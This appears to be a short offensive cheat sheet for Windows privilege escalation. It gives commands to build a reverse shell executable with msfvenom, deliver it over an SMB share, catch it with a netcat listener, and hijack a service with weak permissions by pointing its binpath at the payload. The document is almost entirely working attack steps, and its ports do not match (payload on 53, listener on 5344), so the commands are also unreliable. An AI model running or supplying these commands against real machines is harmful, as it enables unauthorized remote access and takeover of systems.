### 1. Generate a Reverse Shell Executable

```
[Attacker Machine]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
sudo smbserver.py share . -smb2support -username user -password pass

[Windows Machine]
net use \\192.168.177.199\share /user:user pass
copy \\192.168.177.199\share\reverse.exe .

[Attacker Machine]
sudo nc -nvlp 5344

[Windows Machine]
.\reverse.exe
```

### 2. Service Exploits - Insecure Service Permissions

```
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service -Name daclsvc
Get-CimInstance Win32_Service | Select Name, State, StartName, PathName [List all services]
accesschk.exe /accepteula -uwcqv user * [look for SERVICE_CHANGE_CONFIG]

sc qc daclsvc
sc.exe config daclsvc binpath= "C:\Users\user\reverse.exe"
net start daclsvc
```
